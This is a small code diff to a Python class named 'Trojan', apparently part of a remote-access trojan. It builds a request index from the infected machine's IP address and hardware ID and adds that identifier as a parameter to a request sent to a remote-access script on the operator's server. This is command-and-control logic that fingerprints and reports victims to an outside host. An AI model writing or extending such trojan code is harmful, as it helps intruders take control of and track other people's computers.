@@ -113,7 +113,7 @@ class Trojan:
         hwid = self.get_hwid()
 
         # Generating an URI.
-        self.__server_unique_request_index = f"{ip}:{hwid}"
+        self.__server_unique_request_index = f"{ip} : {hwid}"
 
     def show_debug_message(self, message: str) -> None:
         """
@@ -494,7 +494,8 @@ class Trojan:
             response = requests.get(
                 self.__server_url + self.__server_script_remote_access_file,
                 params={
-                    "sync_method": "server-client"
+                    "sync_method": "server-client",
+                    "sync_uri": self.__server_unique_request_index
                 }
             )
         except (requests.exceptions.ConnectionError, requests.exceptions.HTTPError):
